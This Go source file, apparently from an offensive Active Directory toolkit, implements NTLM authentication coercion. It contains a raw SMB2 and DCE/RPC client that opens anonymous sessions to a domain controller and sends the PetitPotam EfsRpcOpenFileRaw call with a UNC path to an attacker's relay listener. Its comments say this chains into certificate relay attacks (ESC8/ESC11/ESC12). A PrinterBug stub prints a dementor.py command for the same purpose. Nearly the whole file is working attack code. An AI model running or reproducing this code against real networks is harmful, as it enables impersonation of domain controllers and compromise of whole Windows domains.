package pki

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"
)

// CoerceMethod identifies the NTLM authentication coercion technique.
type CoerceMethod string

const (
	CoercePetitPotam CoerceMethod = "PetitPotam" // MS-EFSRPC EfsRpcOpenFileRaw
	CoercePrinterBug CoerceMethod = "PrinterBug" // MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
)

// CoerceNTLMAuth triggers an NTLM authentication from a target machine to a
// listener IP using the specified coercion method. This is used to chain with
// relay attacks (ESC8/ESC11/ESC12) — the coerced auth is relayed to the CA's
// enrollment endpoint to obtain a certificate as the target machine account.
//
// targetDC is the machine to coerce (e.g., a domain controller).
// listenerIP is the attacker's relay listener (where ntlmrelayx is running).
func CoerceNTLMAuth(targetDC, listenerIP string, method CoerceMethod) error {
	switch method {
	case CoercePetitPotam:
		return petitPotam(targetDC, listenerIP)
	case CoercePrinterBug:
		return printerBug(targetDC, listenerIP)
	default:
		return fmt.Errorf("unknown coercion method: %s", method)
	}
}

// MS-EFSRPC interface UUID: c681d488-d850-11d0-8c52-00c04fd90f7e v1.0
var efsrpcUUID = [16]byte{
	0x88, 0xd4, 0x81, 0xc6, 0x50, 0xd8, 0xd0, 0x11,
	0x8c, 0x52, 0x00, 0xc0, 0x4f, 0xd9, 0x0f, 0x7e,
}

// --- Stateful SMB2 session ---

// smbSession tracks connection state across the SMB2 handshake: session ID,
// tree ID, file ID, and an auto-incrementing message ID.
type smbSession struct {
	conn      net.Conn
	sessionID uint64
	treeID    uint32
	fileID    [16]byte
	messageID uint64
}

// smb2Header builds a 64-byte SMB2 header using the session's current state.
// MessageID is set to s.messageID and then incremented for the next call.
func (s *smbSession) smb2Header(command uint16) []byte {
	hdr := make([]byte, 64)
	hdr[0] = 0xFE
	hdr[1] = 'S'
	hdr[2] = 'M'
	hdr[3] = 'B'
	binary.LittleEndian.PutUint16(hdr[4:6], 64)                  // StructureSize
	binary.LittleEndian.PutUint16(hdr[12:14], command)            // Command
	binary.LittleEndian.PutUint16(hdr[14:16], 31)                 // CreditRequest
	binary.LittleEndian.PutUint64(hdr[28:36], s.messageID)        // MessageID
	binary.LittleEndian.PutUint32(hdr[36:40], s.treeID)           // TreeID
	binary.LittleEndian.PutUint64(hdr[40:48], s.sessionID)        // SessionID
	s.messageID++
	return hdr
}

// negotiate sends an SMB2 NEGOTIATE and reads the response.
func (s *smbSession) negotiate() error {
	hdr := s.smb2Header(0x0000) // NEGOTIATE

	neg := make([]byte, 36+4) // 36-byte body + 2 dialects * 2 bytes
	binary.LittleEndian.PutUint16(neg[0:2], 36)    // StructureSize
	binary.LittleEndian.PutUint16(neg[2:4], 2)     // DialectCount
	binary.LittleEndian.PutUint16(neg[4:6], 0x01)  // SecurityMode: signing enabled
	binary.LittleEndian.PutUint16(neg[36:38], 0x0202)
	binary.LittleEndian.PutUint16(neg[38:40], 0x0210)

	pkt := smbPacket(hdr, neg)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	_, err := readSMB2Response(s.conn)
	return err
}

// sessionSetupAnonymous performs a two-round-trip NTLMSSP anonymous session
// setup. Round 1 sends NTLMSSP_NEGOTIATE and expects STATUS_MORE_PROCESSING_REQUIRED.
// Round 2 sends NTLMSSP_AUTH with empty credentials to complete the session.
// The session ID is extracted from the final response.
func (s *smbSession) sessionSetupAnonymous() error {
	// --- Round 1: NTLMSSP_NEGOTIATE ---
	hdr1 := s.smb2Header(0x0001) // SESSION_SETUP
	body1 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body1[0:2], 25) // StructureSize

	ntlmNeg := buildNTLMSSPNegotiate()
	secOffset1 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body1[12:14], secOffset1)
	binary.LittleEndian.PutUint16(body1[14:16], uint16(len(ntlmNeg)))
	body1 = append(body1, ntlmNeg...)

	pkt1 := smbPacket(hdr1, body1)
	if _, err := s.conn.Write(pkt1); err != nil {
		return err
	}

	resp1, err := readSMB2Response(s.conn)
	if err != nil {
		// STATUS_MORE_PROCESSING_REQUIRED (0xC0000016) is expected; readSMB2Response
		// allows it, so an error here means something else went wrong.
		return fmt.Errorf("NTLMSSP_NEGOTIATE: %w", err)
	}

	// Extract interim session ID from round 1.
	if len(resp1) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp1[40:48])
	}

	// --- Round 2: NTLMSSP_AUTH (empty credentials) ---
	hdr2 := s.smb2Header(0x0001) // SESSION_SETUP
	body2 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body2[0:2], 25)

	ntlmAuth := buildNTLMSSPAuth()
	secOffset2 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body2[12:14], secOffset2)
	binary.LittleEndian.PutUint16(body2[14:16], uint16(len(ntlmAuth)))
	body2 = append(body2, ntlmAuth...)

	pkt2 := smbPacket(hdr2, body2)
	if _, err := s.conn.Write(pkt2); err != nil {
		return err
	}

	resp2, err := readSMB2Response(s.conn)
	if err != nil {
		return fmt.Errorf("NTLMSSP_AUTH: %w", err)
	}

	// Extract final session ID.
	if len(resp2) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp2[40:48])
	}

	return nil
}

// treeConnect sends an SMB2 TREE_CONNECT to \\target\IPC$ and stores the tree ID.
func (s *smbSession) treeConnect(target string) error {
	hdr := s.smb2Header(0x0003) // TREE_CONNECT

	path := fmt.Sprintf(`\\%s\IPC$`, target)
	pathUTF16 := coerceUTF16LE(path)

	body := make([]byte, 8)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	pathOffset := uint16(64 + 8)
	binary.LittleEndian.PutUint16(body[4:6], pathOffset)
	binary.LittleEndian.PutUint16(body[6:8], uint16(len(pathUTF16)))
	body = append(body, pathUTF16...)

	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	resp, err := readSMB2Response(s.conn)
	if err != nil {
		return err
	}

	// Tree ID is at header bytes 36-39.
	if len(resp) >= 40 {
		s.treeID = binary.LittleEndian.Uint32(resp[36:40])
	}

	return nil
}

// createPipe opens a named pipe and stores the returned file ID.
func (s *smbSession) createPipe(name string) error {
	hdr := s.smb2Header(0x0005) // CREATE
	nameUTF16 := coerceUTF16LE(name)

	body := make([]byte, 57)
	binary.LittleEndian.PutUint16(body[0:2], 57)          // StructureSize
	body[3] = 0                                            // RequestedOplockLevel
	binary.LittleEndian.PutUint32(body[4:8], 0)           // ImpersonationLevel
	binary.LittleEndian.PutUint32(body[24:28], 0x001F01FF) // DesiredAccess: GENERIC_ALL
	binary.LittleEndian.PutUint32(body[28:32], 0x00)       // FileAttributes: 0 for pipes
	binary.LittleEndian.PutUint32(body[32:36], 0x07)       // ShareAccess: read|write|delete
	binary.LittleEndian.PutUint32(body[36:40], 0x01)       // CreateDisposition: FILE_OPEN
	binary.LittleEndian.PutUint32(body[40:44], 0x00400040) // CreateOptions: non-directory
	nameOffset := uint16(64 + 57)
	binary.LittleEndian.PutUint16(body[44:46], nameOffset)
	binary.LittleEndian.PutUint16(body[46:48], uint16(len(nameUTF16)))

	body = append(body, nameUTF16...)
	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return err
	}

	resp, err := readSMB2Response(s.conn)
	if err != nil {
		return err
	}

	// SMB2 CREATE response: header 64 bytes, then body. Per MS-SMB2 2.2.14,
	// FileId is at body offset 64 (raw packet offset 128).
	if len(resp) >= 128+16 {
		copy(s.fileID[:], resp[128:144])
	}

	return nil
}

// writePipe writes data to the currently-open pipe using the stored file ID.
func (s *smbSession) writePipe(data []byte) error {
	hdr := s.smb2Header(0x0009) // WRITE
	body := make([]byte, 49)
	binary.LittleEndian.PutUint16(body[0:2], 49)                   // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], uint16(64+49))        // DataOffset
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(data)))    // Length
	copy(body[16:32], s.fileID[:])                                  // FileId
	body = append(body, data...)
	pkt := smbPacket(hdr, body)
	_, err := s.conn.Write(pkt)
	return err
}

// readPipe issues an SMB2 READ on the currently-open pipe and returns the response.
func (s *smbSession) readPipe() ([]byte, error) {
	hdr := s.smb2Header(0x0008) // READ
	body := make([]byte, 49)
	binary.LittleEndian.PutUint16(body[0:2], 49)  // StructureSize
	binary.LittleEndian.PutUint32(body[4:8], 4096) // Length to read
	copy(body[16:32], s.fileID[:])                  // FileId
	pkt := smbPacket(hdr, body)
	if _, err := s.conn.Write(pkt); err != nil {
		return nil, err
	}
	return readSMB2Response(s.conn)
}

// --- Coercion entry points ---

// petitPotam triggers NTLM auth via MS-EFSRPC EfsRpcOpenFileRaw (opnum 0).
// This is the unauthenticated PetitPotam variant that works on unpatched DCs.
// The target DC connects back to the listener IP via SMB to access the UNC path.
//
// Protocol: DCE/RPC over named pipe \pipe\efsrpc (or \pipe\lsarpc) on port 445.
func petitPotam(targetDC, listenerIP string) error {
	fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s\n", targetDC, listenerIP)

	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect to %s:445: %w", targetDC, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	if err := s.negotiate(); err != nil {
		return fmt.Errorf("SMB negotiate: %w", err)
	}
	if err := s.sessionSetupAnonymous(); err != nil {
		return fmt.Errorf("SMB session setup: %w", err)
	}
	if err := s.treeConnect(targetDC); err != nil {
		return fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	pipes := []string{"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
	var pipeErr error
	for _, pipeName := range pipes {
		if err := s.createPipe(pipeName); err != nil {
			pipeErr = err
			continue
		}
		fmt.Printf("[+] Opened pipe: \\pipe\\%s\n", pipeName)

		if err := rpcBind(s, efsrpcUUID); err != nil {
			pipeErr = fmt.Errorf("RPC bind on %s: %w", pipeName, err)
			continue
		}

		uncPath := fmt.Sprintf(`\\%s\share\file.txt`, listenerIP)
		if err := efsRpcOpenFileRaw(s, uncPath); err != nil {
			pipeErr = fmt.Errorf("EfsRpcOpenFileRaw: %w", err)
			continue
		}

		fmt.Printf("[+] PetitPotam: Coercion sent — %s should authenticate to %s\n", targetDC, listenerIP)
		return nil
	}

	return fmt.Errorf("PetitPotam failed on all pipes: %w", pipeErr)
}

// printerBug triggers NTLM auth via MS-RPRN RpcRemoteFindFirstPrinterChangeNotification.
// Requires authenticated access to the target (unlike PetitPotam's unauthenticated variant).
func printerBug(targetDC, listenerIP string) error {
	fmt.Printf("[*] PrinterBug: Triggering NTLM auth from %s to %s\n", targetDC, listenerIP)
	fmt.Printf("[!] PrinterBug requires authenticated SMB access — use PetitPotam for unauthenticated coercion\n")
	fmt.Printf("[*] Manual: python3 dementor.py -d <DOMAIN> -u <USER> -p <PASS> %s %s\n", listenerIP, targetDC)
	return fmt.Errorf("PrinterBug requires authentication — use PetitPotam or run dementor.py manually")
}

// --- DCE/RPC over SMB pipe ---

// rpcBind sends a DCE/RPC bind request for the given interface UUID over the SMB pipe.
func rpcBind(s *smbSession, interfaceUUID [16]byte) error {
	callID := rand.Uint32()

	// Presentation context list: 1 context, 1 transfer syntax (NDR).
	// 48 bytes: numContexts(1) + reserved(3) + contextID(2) + numTransferSyntaxes(2) +
	// abstractSyntaxUUID(16) + abstractVersion(4) + ndrUUID(16) + ndrVersion(4)
	ctxList := make([]byte, 48)
	ctxList[0] = 1 // num contexts
	ctxList[4] = 0 // context ID
	ctxList[6] = 1 // num transfer syntaxes
	copy(ctxList[8:24], interfaceUUID[:])
	binary.LittleEndian.PutUint16(ctxList[24:26], 1) // abstract syntax version 1.0
	// NDR transfer syntax: 8a885d04-1ceb-11c9-9fe8-08002b104860 v2.0
	ndr := [16]byte{0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}
	copy(ctxList[28:44], ndr[:])
	binary.LittleEndian.PutUint32(ctxList[44:48], 2) // NDR version 2

	// Bind body: max_xmit(2) + max_recv(2) + assoc_group(4) + ctx_list
	bindBody := make([]byte, 8)
	binary.LittleEndian.PutUint16(bindBody[0:2], 4280)
	binary.LittleEndian.PutUint16(bindBody[2:4], 4280)
	bindBody = append(bindBody, ctxList...)

	// DCE/RPC header (16 bytes)
	fragLen := uint16(16 + len(bindBody))
	hdr := make([]byte, 16)
	hdr[0] = 5    // version major
	hdr[1] = 0    // version minor
	hdr[2] = 0x0B // BIND
	hdr[3] = 0x03 // first+last frag
	hdr[4] = 0x10 // data rep: little-endian
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var bind []byte
	bind = append(bind, hdr...)
	bind = append(bind, bindBody...)

	if err := s.writePipe(bind); err != nil {
		return fmt.Errorf("write RPC bind: %w", err)
	}

	_, err := s.readPipe()
	return err
}

// efsRpcOpenFileRaw calls EfsRpcOpenFileRaw (opnum 0) with a UNC path pointing
// to the attacker's listener, triggering NTLM authentication from the target.
func efsRpcOpenFileRaw(s *smbSession, uncPath string) error {
	callID := rand.Uint32()

	// NDR-encode the request:
	// hContext: 20 bytes (null)
	// FileName: conformant varying string
	// Flags: uint32 = 0
	pathUTF16 := coerceUTF16LE(uncPath)
	pathWords := len(pathUTF16)/2 + 1 // +1 for null terminator

	var stub []byte
	stub = append(stub, make([]byte, 20)...) // hContext
	stub = appendLE32(stub, uint32(pathWords))
	stub = appendLE32(stub, 0)
	stub = appendLE32(stub, uint32(pathWords))
	stub = append(stub, pathUTF16...)
	stub = append(stub, 0, 0) // null terminator
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}
	stub = appendLE32(stub, 0) // Flags

	// DCE/RPC request (type 0x00)
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub)))
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0) // context_id
	binary.LittleEndian.PutUint16(reqHdr[6:8], 0) // opnum 0

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5
	hdr[1] = 0
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03
	hdr[4] = 0x10
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return fmt.Errorf("write EfsRpcOpenFileRaw: %w", err)
	}

	// Read response to avoid leaving the connection in a bad state.
	s.readPipe()
	return nil
}

// --- SMB2 packet helpers ---

func smbPacket(header, body []byte) []byte {
	totalLen := len(header) + len(body)
	nb := make([]byte, 4)
	nb[0] = 0x00
	nb[1] = byte(totalLen >> 16)
	nb[2] = byte(totalLen >> 8)
	nb[3] = byte(totalLen)
	pkt := append(nb, header...)
	pkt = append(pkt, body...)
	return pkt
}

// readSMB2Response reads a full SMB2 response (header + body) from the wire.
func readSMB2Response(conn net.Conn) ([]byte, error) {
	nb := make([]byte, 4)
	if _, err := readFull(conn, nb); err != nil {
		return nil, fmt.Errorf("read NetBIOS header: %w", err)
	}
	length := int(nb[1])<<16 | int(nb[2])<<8 | int(nb[3])
	if length <= 0 || length > 65536 {
		return nil, fmt.Errorf("invalid SMB response length: %d", length)
	}

	data := make([]byte, length)
	if _, err := readFull(conn, data); err != nil {
		return nil, fmt.Errorf("read SMB response: %w", err)
	}

	// Check NT status at header offset 8.
	if len(data) >= 12 {
		status := binary.LittleEndian.Uint32(data[8:12])
		if status != 0 && status != 0xC0000016 {
			return data, fmt.Errorf("SMB status 0x%08X", status)
		}
	}

	return data, nil
}

func readFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// --- NTLMSSP token builders ---

// buildNTLMSSPNegotiate builds a Type 1 (NTLMSSP_NEGOTIATE) token.
func buildNTLMSSPNegotiate() []byte {
	msg := make([]byte, 32)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 1)          // Type 1
	binary.LittleEndian.PutUint32(msg[12:16], 0x00088207) // Flags
	return msg
}

// buildNTLMSSPAuth builds a Type 3 (NTLMSSP_AUTH) token with empty credentials
// for anonymous/null session authentication.
//
// Layout (88 bytes fixed):
//
//	"NTLMSSP\0"(8) + Type(4) + LmResponse(8) + NtResponse(8) + Domain(8) +
//	User(8) + Workstation(8) + EncryptedRandomSessionKey(8) + NegotiateFlags(4)
//
// All security buffer offsets point to byte 88 (right past the fixed header).
func buildNTLMSSPAuth() []byte {
	const fixedLen = 88
	msg := make([]byte, fixedLen)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 3) // Type 3

	// Each security buffer: Len(2) + MaxLen(2) + Offset(4) — all lengths 0,
	// all offsets point to fixedLen.
	offsets := []int{12, 20, 28, 36, 44, 52} // LmResp, NtResp, Domain, User, Workstation, EncRandSessKey
	for _, off := range offsets {
		binary.LittleEndian.PutUint16(msg[off:off+2], 0)              // Len
		binary.LittleEndian.PutUint16(msg[off+2:off+4], 0)            // MaxLen
		binary.LittleEndian.PutUint32(msg[off+4:off+8], fixedLen)     // Offset
	}

	// NegotiateFlags: NEGOTIATE_UNICODE | NEGOTIATE_NTLM + misc
	binary.LittleEndian.PutUint32(msg[60:64], 0x00088203)

	return msg
}

// --- String helpers ---

func coerceUTF16LE(s string) []byte {
	runes := []rune(s)
	out := make([]byte, 0, len(runes)*2+2)
	for _, r := range runes {
		if r <= 0xFFFF {
			out = append(out, byte(r), byte(r>>8))
		}
	}
	return out
}

func appendLE32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}
